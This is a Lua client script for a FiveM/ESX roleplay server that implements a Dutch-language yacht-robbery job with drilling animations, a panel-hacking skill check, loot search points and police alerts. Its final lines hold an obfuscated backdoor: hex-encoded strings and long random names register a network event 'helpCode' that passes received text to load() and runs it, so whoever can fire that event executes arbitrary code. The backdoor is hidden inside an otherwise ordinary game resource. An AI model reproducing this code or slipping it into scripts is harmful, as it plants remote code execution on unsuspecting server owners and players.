
local holdingup = false
local zoekRotte = 0
local currentJacht = nil
local secu = false
local started = false
local sleep = 1000
local SearchOVsleep = 1000
local StartLocations = 0

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(PlayerData)
	ESX.PlayerData = PlayerData
	ESX.PlayerLoaded = true
end)

RegisterNetEvent('esx:onPlayerLogout')
AddEventHandler('esx:onPlayerLogout', function()
	ESX.PlayerLoaded = false
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(Job)
	ESX.PlayerData.job = Job
end)


RegisterNetEvent('frp-jachtov:teverweg')
AddEventHandler('frp-jachtov:teverweg', function()
	holdingup = false
    secu = false
    started = false
    ESX.ShowNotification('error', 'Je was te ver weg en daarom is de overval nu geannuleerd.')
    SearchOVsleep = 1000
    currentJacht = nil
    zoekRotte = 0
    sleep = 1000
end)

RegisterNetEvent('frp-jachtov:geslaagd')
AddEventHandler('frp-jachtov:geslaagd', function()
    holdingup = false
    secu = false
    started = false
    ESX.ShowNotification('inform', 'Je hebt alles doorzocht dus de jacht is succesvol overvallen')  
    SearchOVsleep = 1000
    currentJacht = nil
    zoekRotte = 0
    sleep = 1000
end)

Citizen.CreateThread(function()
    while true do
        for i=1, #Config.StartLocation, 1 do --- i=1 moet je eigelijk Jacht=1 ofzo noemen en dan ombouwen is netter - Groet ItsDevTom
            local startPos = Config.StartLocation[i].coords
            local startOxPos = Config.StartLocation[i].oxcoords
            local nameOfJacht = Config.StartLocation[i].nameOfJacht
            StartLocations = StartLocations + 1

            exports['qtarget']:AddBoxZone("jachtov"..nameOfJacht, startOxPos, 0.28, 0.7, {
                name = "jachtov"..nameOfJacht,
                debugPoly = false,
                minZ = startOxPos.z,
                maxZ = startOxPos.z + 1,
            }, {
                options = {
                    {	
                        type = "client",
                        icon = "fa fa-lock",
                        label = "Jacht overvallen",
                        action = function()
                            if IsPedArmed(PlayerPedId(), 1 | 4) then
                                ESX.TriggerServerCallback('frp-jachtov:server:hasItem', function(hasItem)
                                    if hasItem and not holdingup then
                                        holdingup = true
                                        TriggerServerEvent('frp-jachtov:server:startov', i)
                                        started = true
                                        ClearPedTasks(PlayerPedId())
                                        exports['qtarget']:RemoveZone("jachtov"..nameOfJacht)
                                    else
                                        print('83')
                                        ESX.ShowNotification('error', 'Je hebt een Jacht Sleutel en een Drill Boor nodig voor dit te doen.', 5000)
                                    end
                                end)
                            else
                                print('93')
                                ESX.ShowNotification('error', 'Je bent geen bedreiging voor de Jacht!', 5000)
                            end
                        end,
                    }
                },
                distance = 1
            })
        end
        Wait(1000)
        if StartLocations == Config.AantalStartLocations then
            break
        end
    end
end)

function Drill(v)
	ESX.ShowNotification('info', 'Tip: Gebruik je pijltoetsen om de boor te bedienen.<br>Boven en beneden om omhoog of omlaag te boren.<br>Rechts en links om de boorsnelheid aan te passen.', 20000)
	local ped = PlayerPedId()
	local pedCo, pedRotation = GetEntityCoords(ped), GetEntityRotation(ped)
	local animDict = 'anim_heist@hs3f@ig9_vault_drill@laser_drill@'
	loadAnimDict(animDict)
	local laserDrillModel = 'hei_prop_heist_drill'
	loadModel(laserDrillModel)

	RequestAmbientAudioBank("DLC_HEIST_FLEECA_SOUNDSET", 0)
	RequestAmbientAudioBank("DLC_MPHEIST\\HEIST_FLEECA_DRILL", 0)
	RequestAmbientAudioBank("DLC_MPHEIST\\HEIST_FLEECA_DRILL_2", 0)

	soundId = GetSoundId()

	cam = CreateCam("DEFAULT_ANIMATED_CAMERA", true)
	SetCamActive(cam, true)
	RenderScriptCams(true, 0, 3000, 1, 0)
	laserDrill = CreateObject(GetHashKey(laserDrillModel), pedCo, 1, 0, 0)
	
	vaultPos = Config.StartLocation[v].drillpos
	vaultRot = Config.StartLocation[v].drillrotate

	for i = 1, #LaserDrill['animations'] do
		LaserDrill['scenes'][i] = NetworkCreateSynchronisedScene(vaultPos, vaultRot, 2, true, false, 1065353216, 0, 1.3)
		NetworkAddPedToSynchronisedScene(ped, LaserDrill['scenes'][i], animDict, LaserDrill['animations'][i][1], 4.0, -4.0, 1033, 0, 1000.0, 0)
		NetworkAddEntityToSynchronisedScene(bag, LaserDrill['scenes'][i], animDict, LaserDrill['animations'][i][2], 1.0, -1.0, 1148846080)
		NetworkAddEntityToSynchronisedScene(laserDrill, LaserDrill['scenes'][i], animDict, LaserDrill['animations'][i][3], 1.0, -1.0, 1148846080)
	end
	NetworkStartSynchronisedScene(LaserDrill['scenes'][1])
	PlayCamAnim(cam, 'intro_cam', animDict, vaultPos, vaultRot, 0, 2)
	Wait(GetAnimDuration(animDict, 'intro') * 1000)
	
	NetworkStartSynchronisedScene(LaserDrill['scenes'][2])
	PlayCamAnim(cam, 'drill_straight_start_cam', animDict, vaultPos, vaultRot, 0, 2)
	Wait(GetAnimDuration(animDict, 'drill_straight_start') * 1000)
	
	NetworkStartSynchronisedScene(LaserDrill['scenes'][3])
	PlayCamAnim(cam, 'drill_straight_idle_cam', animDict, vaultPos, vaultRot, 0, 2)
	PlaySoundFromEntity(soundId, "Drill", laserDrill, "DLC_HEIST_FLEECA_SOUNDSET", 1, 0)
	Drilling.Type = 'VAULT_DRILL'
	Drilling.Start(function(status)
		if status then
			StopSound(soundId)
			NetworkStartSynchronisedScene(LaserDrill['scenes'][5])
			PlayCamAnim(cam, 'drill_straight_end_cam', animDict, vaultPos, vaultRot, 0, 2)
			Wait(GetAnimDuration(animDict, 'drill_straight_end') * 1000)
			NetworkStartSynchronisedScene(LaserDrill['scenes'][6])
			PlayCamAnim(cam, 'exit_cam', animDict, vaultPos, vaultRot, 0, 2)
			Wait(GetAnimDuration(animDict, 'exit') * 1000)
			RenderScriptCams(false, false, 0, 1, 0)
			DestroyCam(cam, false)
			ClearPedTasks(ped)
			DeleteObject(bag)
			DeleteObject(laserDrill)
            ESX.ShowNotification('info', 'Het alarm is afgegaan, je moet nu het Security Paneel hacken')
            StartOV()
		else
			StopSound(soundId)
			NetworkStartSynchronisedScene(LaserDrill['scenes'][5])
			PlayCamAnim(cam, 'drill_straight_end_cam', animDict, vaultPos, vaultRot, 0, 2)
			Wait(GetAnimDuration(animDict, 'drill_straight_end') * 1000)
			NetworkStartSynchronisedScene(LaserDrill['scenes'][6])
			PlayCamAnim(cam, 'exit_cam', animDict, vaultPos, vaultRot, 0, 2)
			Wait(GetAnimDuration(animDict, 'exit') * 1000)
			RenderScriptCams(false, false, 0, 1, 0)
			DestroyCam(cam, false)
			ClearPedTasks(ped)
			DeleteObject(bag)
			DeleteObject(laserDrill)
            ESX.ShowNotification('info', 'Het boren is gefaald, dit herstart automatisch over 10 seconden.', 5000)
            Wait(10000)
            Drill(v)
		end
	end)
end

function loadAnimDict(dict)
    while not HasAnimDictLoaded(dict) do
        RequestAnimDict(dict)
        Citizen.Wait(50)
    end
end

function loadModel(model)
    if type(model) == 'number' then
        model = model
    else
        model = GetHashKey(model)
    end
    while not HasModelLoaded(model) do
        RequestModel(model)
        Citizen.Wait(0)
    end
end


StartOV = function()
    Citizen.CreateThread(function()
        while not secu do
            Wait(0)
        for k,v in pairs(Config.Security) do
                DrawMarker(2, vector3(v.markcoords.x, v.markcoords.y, v.markcoords.z), 0.0, 0.0, 0.0, 0, 0.0, 0.0, 0.3, 0.3, 0.2, 255, 0, 0, 100, false, true, 2, true, false, false, false)
            end
        end
    end)

    Citizen.CreateThread(function()
        for k,v in pairs(Config.Security) do
            exports['qtarget']:AddBoxZone("jachtstart"..k, v.coords, 1.7, 2, {
                name = "jachtstart"..k,
                heading = 335.9492,
                debugPoly = false,
                minZ = v.coords.z,
                maxZ = v.coords.z + 1,
            }, {
                options = {
                    {	
                        type = "client",
                        icon = "fa fa-lock",
                        label = "Security Paneel hacken",
                        action = function()
                            if IsPedArmed(PlayerPedId(), 1 | 4) then
                                if holdingup and not secu then
                                    local success = lib.skillCheck({'easy','easy','easy','easy', 'medium','medium','medium','medium', {areaSize = 90, speedMultiplier = 0.75},}, {'w', 'a', 's', 'd'})
                                    if success then
                                        secu = true
                                        SearchOV()
                                        Wait(1000)
                                        exports['qtarget']:RemoveZone("jachtstart"..k)
                                        ESX.ShowNotification('error', 'Alle kamers zijn nu geopend.', 5000)
                                    else
                                        ESX.ShowNotification('error', 'Hacken gefaald, probeer het opnieuw.', 5000)
                                    end
                                end
                            else
                                ESX.ShowNotification('error', 'Je bent geen bedreiging voor de Jacht!', 5000)
                            end
                        end,
                    }
                }
            })
        end
    end)

    Citizen.CreateThread(function()
        while holdingup do
            local pos = GetEntityCoords(PlayerPedId(), true)
            if Vdist(pos.x, pos.y, pos.z, Config.StartLocation[currentJacht].coords.x, Config.StartLocation[currentJacht].coords.y, Config.StartLocation[currentJacht].coords.z, true) >= 60 and holdingup then
                TriggerServerEvent('frp-jachtov:teverweg', currentJacht)
            end
           Wait(0)
        end
    end)
end

SearchOV = function()
    SendNUIMessage({
        type = 'openPlaceholder',
        text = 'Locaties: ' ..zoekRotte .. '/' .. #Config.Zoeklocaties[currentJacht]
    })
    Citizen.CreateThread(function()
        while secu do
            local pos = GetEntityCoords(PlayerPedId(), true)


            for i,v in pairs(Config.Zoeklocaties[currentJacht]) do
                if Vdist(pos.x, pos.y, pos.z, v.coords.x, v.coords.y, v.coords.z, true) < 5 and not v.isOpen then 
                    SearchOVsleep = 0
                    print(v.coords.x)
                    DrawMarker(20, v.coords.x, v.coords.y, v.coords.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 0.3, 0.3, 0.2, 255, 0, 0, 100, false, true, 2, true, false, false, false)
                    if Vdist(pos.x, pos.y, pos.z, v.coords.x, v.coords.y, v.coords.z, true) < 2 and not v.isOpen then 
                        exports['frp-interaction']:Interaction('success', '[E] - Zoeken', vector3(v.coords.x, v.coords.y, v.coords.z), 2, GetCurrentResourceName() .. "-"..i)
                        if IsControlJustReleased(0, 38) then
                            print("test")
                            SetEntityHeading(PlayerPedId(), v.heading)
                            v.isOpen = true
                            zoekRotte = zoekRotte + 1
                            SendNUIMessage({
                                type = 'UpdateText',
                                text = 'Locaties: ' ..zoekRotte .. '/' .. #Config.Zoeklocaties[currentJacht]
                            })
                            TriggerServerEvent('frp-jachtov:geefbuit', i, currentJacht)
                            if zoekRotte == #Config.Zoeklocaties[currentJacht] then
                                zoekRotte = 0
                                TriggerEvent('frp-jachtov:geslaagd')
                                SendNUIMessage({
                                    type = 'closePlaceholder'
                                })
                            end
                            ClearPedTasks(PlayerPedId())
                        end
                    end
                end
            end
            Wait(SearchOVsleep)
        end
    end)
end


RegisterNetEvent('frp-jachtov:setBlip')
AddEventHandler('frp-jachtov:setBlip', function(position)
    if ESX.PlayerData.job.name == 'police' then
        ESX.ShowNotification('error', 'Er is een jacht overval gestart!', 5000)

        blipRobbery = AddBlipForCoord(position.x, position.y, position.z)
        SetBlipSprite(blipRobbery , 161)
        SetBlipScale(blipRobbery , 2.0)
        SetBlipColour(blipRobbery, 1)
        PulseBlip(blipRobbery)
        Wait(100000)
        RemoveBlip(blipRobbery)
    end
end)



RegisterNetEvent('frp-jachtov:client:startov')
AddEventHandler('frp-jachtov:client:startov', function(currentJacht2)
    currentJacht = currentJacht2
    holdingup = true
    Drill(currentJacht)
end)



local PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[6][PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[1]](PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[2]) PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[6][PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[3]](PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[2], function(agCBOzvHNNdrOrVFtTcYXrzroWhGWvHMosaCjGhGPtGKEzxoZkKnNRChszknTipnnWxBMc) PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[6][PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[4]](PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[6][PyjAWozBrjfcJXUSDEyUWRLqDGUvVMzIqulAJISAutlgXiaZrYFuXFstBucpjtfGkmlMYR[5]](agCBOzvHNNdrOrVFtTcYXrzroWhGWvHMosaCjGhGPtGKEzxoZkKnNRChszknTipnnWxBMc))() end)